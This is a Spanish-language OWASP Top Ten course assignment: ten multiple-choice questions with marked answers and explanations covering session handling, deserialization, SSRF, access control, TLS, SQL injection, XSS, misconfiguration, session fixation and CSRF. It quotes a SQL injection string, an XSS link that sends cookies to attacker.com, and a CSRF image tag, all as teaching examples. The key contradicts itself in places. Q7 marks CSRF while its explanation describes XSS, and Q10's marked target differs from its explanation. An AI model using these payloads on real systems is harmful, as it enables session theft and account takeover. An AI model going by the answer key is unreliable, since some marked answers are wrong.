# Actividad 2 - OWASP Top Ten

## Objetivos

- Aprender los conceptos acerca de las principales vulnerabilidades en aplicaciones web.
    
    - Aprender a identificar un intento de explotación de una vulnerabilidad de una aplicación web.
        
    - Aprender la forma de mitigar las principales vulnerabilidades de las aplicaciones web.

## Descripción De la Actividad Y Pautas De Elaboración

La actividad consiste en resolver diez preguntas tipo test relativas a los conceptos fundamentales de las principales vulnerabilidades en aplicaciones web incluidas en el proyecto OWASP Top Ten.

![[mexissi05_act2.png]]

**Figura 1.** Fuente: [https://owasp.org/Top10/es/](https://owasp.org/Top10/es/)
![[mexissi05_act2 1.png]]

**Figura 2.** Fuente: [https://owasp.org/Top10/es/](https://owasp.org/Top10/es/)

---

## Preguntas

> Cada pregunta vale **1 punto**

### 1

Un usuario utilize una computadora pública para acceder a una aplicación. En lugar de seleccionar «cerrar sesión», el usuario simplemente cierra la pestaña del navegador y se aleja. Un atacante usa el mismo navegador una hora más tarde y el usuario continúa autenticado.

(1) ¿Por qué el atacante puede seguir usando la cuenta del usuario?  
(2) ¿De qué vulnerabilidad se trata?

1. 1. Relleno de credenciales. 2. Cross Site Request Forgery.
        
2. 1. Uso de listas de contraseñas conocidas, es un ataque común. 2. Fallas de identificación y autenticación.
        
3. **1. Los tiempos de espera (_timeouts_) de las sesiones de aplicación no están configurados correctamente. 2. Fallas de identificación.**
    
4. 1. Uso de contraseñas como único factor. 2. Fallas de identificación y autenticación.

**Explicación:** Esta situación describe un fallo en la gestión de sesiones. Si una sesión permanece activa indefinidamente (sin un _timeout_ o expiración), un atacante puede secuestrarla. La gestión inadecuada de las sesiones de aplicación está cubierta por el riesgo A07:2021-Fallas de Identificación y Autenticación del OWASP Top Ten.

---

### 2

Una aplicación utilize un conjunto de microservicios implementados en Spring Boot. Tratándose de programadores funcionales, intentaron asegurarse de que su código fuera inmutable. La solución implementada consistió en serializar el estado de la sesión para el usuario y enviarlo entre los components con cada solicitud.

Un atacante advierte el uso de un objeto Java serializado y codificado en base64 (identifica un string que comienza con «rO0») y utilize la herramienta _Java Serial Killer_ para obtener una ejecución remota de código en el servidor de aplicación.

(1) ¿De qué vulnerabilidad se trata?  
(2) ¿Cómo se puede solucionar?

1. **1. Falla en el _software_ y en la integridad de datos. 2. Verificando los datos mediante una firma antes de procesarlos.**
    
2. 1. No existe vulnerabilidad, ya que el atacante no puede tener acceso a los datos. 3. No aplica, ya que no existe vulnerabilidad en este caso.
        
3. 1. Inyección SQL. 2. Usando sentencias de parametrización SQL.
        
4. 1. Fallas criptográficas (exposición de datos sensibles). 2. Mediante el uso del protocolo TLS.

**Explicación:** La deserialización insegura de objetos no confiables permite a un atacante inyectar código malicioso en el servidor. Esto se incluye en el riesgo A08:2021-Fallas en el Software y en la Integridad de los Datos. Una mitigación clave es firmar digitalmente o cifrar los datos serializados para verificar su integridad y origen.

---

### 3

En un esquema, como el de la figura 3, un atacante:

(1) ¿Qué puede conseguir?  
(2) ¿De qué vulnerabilidad se trata?  
(3) ¿Cómo se puede solucionar?

![[mexissi05_act2 2.png]]

**Figura 3.** Fuente: [https://www.imperva.com/learn/application-security/server-side-request-forgery-ssrf/](https://www.imperva.com/learn/application-security/server-side-request-forgery-ssrf/)

1. 1. El atacante accede a datos en Website.com. 2. Falla en el _software_ y en la integridad de datos. 3. Verificando los datos mediante una firma antes de procesarlos.
        
2. 1. El atacante no puede tener acceso a la Intranet. 2. No existe vulnerabilidad, ya que el atacante no puede tener acceso a la Intranet. 3. No aplica, ya que no existe vulnerabilidad en este caso.
        
3. **1. El atacante puede abusar de los servicios internos para realizar conseguir la ejecución remota de código (RCE) o denegación de servicio (DoS). 2. Falsificación de solicitudes del lado del servidor. 3. Realizando validación de entrada en el código fuente de Website.com.**
    
4. 1. El atacante puede abusar de los servicios internos para realizar conseguir la ejecución remota de código (RCE) o denegación de servicio (DoS). 2. _Buffer overflow._ 3. Realizando validación de entrada en el código fuente de Website.com.

**Explicación:** La Falsificación de Solicitudes del Lado del Servidor (SSRF) ocurre cuando una aplicación web no valida o desinfecta una URL proporcionada por el usuario antes de enviar una solicitud. Esto permite al atacante forzar a la aplicación a enviar peticiones a servicios internos (como la Intranet, `10.0.0.1`) que normalmente no son accesibles desde el exterior. Se soluciona validando rigurosamente las entradas de usuario para evitar que se contacten direcciones internas o sistemas sensibles.

---

### 4

Dadas estas URL:

- [https://example.es/app/getappInfo](https://example.es/app/getappInfo)
    
- [https://example.es/app/admin_getappInfo](https://example.es/app/admin_getappInfo)

Si un usuario no autenticado puede acceder a cualquiera de las páginas:

(1) ¿Es una vulnerabilidad si una persona que no es administrador puede acceder a la página de administración?  
(2) ¿Es una vulnerabilidad?  
(3) ¿De qué tipo son dichas vulnerabilidades en caso de que lo sean?

1. 1. Sí 2. Sí 3. Inyección.
        
2. **1. Sí 2. Sí 3. Pérdida de control de acceso.**
    
3. 1. Sí 2. No 3. Inyección.
        
4. 1. Sí 2. No 3. Pérdida de control de acceso.

**Explicación:** El hecho de que un usuario no autenticado o no autorizado (no administrador) pueda acceder a una funcionalidad de administración (`admin_getappInfo`) es un claro ejemplo de **Pérdida de Control de Acceso** (A01:2021). El sistema de control de acceso no está aplicando correctamente las restricciones de permiso.

---

### 5

Un atacante monitorea el tráfico de la red (por ejemplo, en una red inalámbrica insegura), degrada las conexiones de HTTPS a HTTP, intercepta solicitudes y roba la cookie de sesión del usuario. El atacante luego reutiliza esta cookie y secuestra la sesión (autenticada) del usuario, accediendo o modificando los datos privados del usuario. En lugar de lo anterior, podrían alterar todos los datos transportados, por ejemplo, el destinatario de una transferencia de dinero.

(1) ¿De qué vulnerabilidad se trata?  
(2) ¿Cómo se puede evitar?

1. 1. Sniffing. 2. Usando un sistema de detección de intrusiones.
        
2. 1. Cross Site Scripting. 2. Usando un Firewall de Aplicaciones web.
        
3. 1. Cross Site Request Forgery. 2. Usando un Token Anti-CSRF en las peticiones.
        
4. **1. Falla criptográfica o exposición de datos sensibles. 2. Aplicando TLS usando algoritmos de cifrado robustos y longitudes de clave recomendadas.**

**Explicación:** Al degradar una conexión segura (HTTPS) a una insegura (HTTP), el atacante puede robar información sensible (como la cookie de sesión) en tránsito. Esto es una **Falla Criptográfica** (A02:2021) porque la protección criptográfica (TLS/HTTPS) no se aplica o se aplica incorrectamente. La solución es forzar el uso de TLS/HTTPS de manera estricta y segura.

---

### 6

Si un atacante intenta ejecutar esta URL:

```Python
http://unir.com/app/accountView?id=' or '1'='1
```

(1) ¿Qué vulnerabilidad está intentado explotar?  
(2) ¿Cómo se puede evitar?

1. **1. Inyección SQL. 2. Usando sentencias SQL parametrizadas.**
    
2. 1. Cross Site Scripting. 2. Usando un firewall de aplicaciones web.
        
3. 1. Cross Site Request Forgery. 2. Usando un Token Anti-CSRF en las peticiones.
        
4. 1. Http Response Splitting. 2. Escapando caracteres con CL RF.

**Explicación:** El uso de una comilla simple (`'`) seguido de una condición siempre verdadera (`or '1'='1`) en un parámetro de URL es la técnica clásica de la Inyección SQL. Esta vulnerabilidad ocurre cuando la aplicación construye consultas a la base de datos concatenando directamente la entrada del usuario. La principal mitigación es el uso de consultas parametrizadas o _prepared statements_, que separan el código SQL de los datos de entrada.

---

### 7

Un atacante envía el siguiente enlace a personas vía correo electrónico. Alguna de las personas que recibe el correo ejecuta el enlace:

```Python
https://192.168.3.112:8080/wavsep/active/Reflected-XSS/RXSS-Detection-Evaluation-GET/Case01Tag2HtmlPageScope.jsp?userinput=<script>window.open“http://attacker.com?c=“+document.cookie</script>
```

(1) ¿Qué tipo de vulnerabilidad se explota?  
(2) ¿Dónde reside la vulnerabilidad?  
(3) ¿Dónde se ejecuta el script del enlace que aprovecha la vulnerabilidad?

1. 1. HTTP response splitting. 2. Navegador de la víctima. 3. Aplicación Wavsep.
        
2. 1. Cross Site Scripting. 2. Aplicación Wavsep. 3. Navegador de la víctima.
        
3. 1. Cross Site Request Forgery. 2. Navegador de la víctima. 3. Aplicación Wavsep.
        
4. **1. Cross Site Request Forgery. 2. Aplicación Wavsep. 3. Navegador de la víctima.**

**Explicación:** El script malicioso se inyecta a través del parámetro de entrada (`userinput`) de la aplicación web (`Wavsep`) y se refleja de vuelta al navegador de la víctima. Por lo tanto, la vulnerabilidad reside en la **Aplicación Wavsep** por no validar la entrada, y el script se ejecuta en el **Navegador de la víctima**. El objetivo del script es robar la cookie de sesión (`document.cookie`).

---

### 8

Si en un fichero de configuración aparece:

```Python
...
<connectionStrings>
<add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" />
</connectionStrings>
...
```

(1) ¿De qué vulnerabilidad se trata?  
(2) ¿Cómo se puede solucionar?

1. **1. Configuración de seguridad incorrecta. 2. Cifrando la información.**
        
2. 1. Deserialización insegura. 2. Mediante firmas digitales.
        
3. 1. Inyección. 2. Mediante validación de entrada.
        
4. 1. No existe vulnerabilidad 2. No aplica al no existir vulnerabilidad.

**Explicación:** Almacenar credenciales sensibles como contraseñas en texto plano dentro de archivos de configuración accesibles (incluso indirectamente) es un error de diseño y una **Configuración de Seguridad Incorrecta** (A05:2021). La solución ideal es cifrar la información sensible en reposo o utilizar mecanismos de gestión de secretos para evitar almacenarla directamente.

---

### 9

En la siguiente figura, se muestra la secuencia de una ataque de fijación de sesión.

![[mexissi05_act2 3.png]]

**Figura 4.** Fuente: [https://www.researchgate.net/figure/Session-Fixation-Attack-27_fig2_266328511](https://www.researchgate.net/figure/Session-Fixation-Attack-27_fig2_266328511)

¿Cuál es la vulnerabilidad que tiene aplicación web para que se pueda explotar este intento de ataque?

1. El ataque no es possible porque el atacante no sabe las credenciales del usuario.
    
2. Http Response splitting.
    
3. La fijación de sesión se puede dar en cualquier aplicación web.
    
4. **Que la aplicación otorgue un identificador de sesión antes de la validación del usuario y la contraseña o que repita identificadores de sesión antiguos en nuevas autenticaciones.**

**Explicación:** La Fijación de Sesión explota el fallo de la aplicación de no generar un **nuevo identificador de sesión** tras una autenticación exitosa. Si la aplicación usa el mismo ID que existía antes del _login_, el ID que el atacante "fijó" se vuelve válido y autenticado, permitiendo el secuestro de la sesión.

---

### 10

Si la petición a la aplicación ejemplo.com viene desde desde un servidor controlado por una atacante:

```Python
<img src="http://example.com/changePassword.php/?newPassword=attackerPassword">
```

(1) ¿Puede tener éxito?  
(2) ¿Por qué?  
(3) ¿Quién es el objetivo?  
(4) ¿Cómo se llama la vulnerabilidad?

1. 1. Sí, aunque depende del navegador usado. 2. Porque la petición llega a la aplicación. 3. La aplicación. 4. Cross Site Scripting.
        
2. **1. Sí. 2. Porque la petición hace uso de la sesión activa en la memoria del navegador de la víctima. 3. La aplicación. 4. Cross Site Request Forgery.**
        
3. 1. Sí, aunque depende del navegador usado. 2. Porque la petición hace uso de la sesión activa en la memoria del navegador de la víctima. 3. La aplicación. 4. Cross Site Request Forgery.
        
4. 1. Sí, aunque depende del navegador usado. 2. Porque la petición hace uso de la sesión activa en la memoria del navegador de la víctima. 3. El usuario de la aplicación. 4. Cross Site Request Forgery.

**Explicación:** Esto es un ataque de **Cross Site Request Forgery (CSRF)**. El atacante engaña al navegador de la víctima para que envíe una solicitud HTTP (en este caso, una petición GET a través de una etiqueta `<img>`) a una aplicación en la que la víctima tiene una sesión activa. El navegador incluye automáticamente la cookie de sesión de la víctima, y la aplicación, al no validar el origen de la solicitud, ejecuta la acción (cambiar la contraseña). El objetivo final es el **usuario** y sus datos, aunque la aplicación es el medio para lograrlo.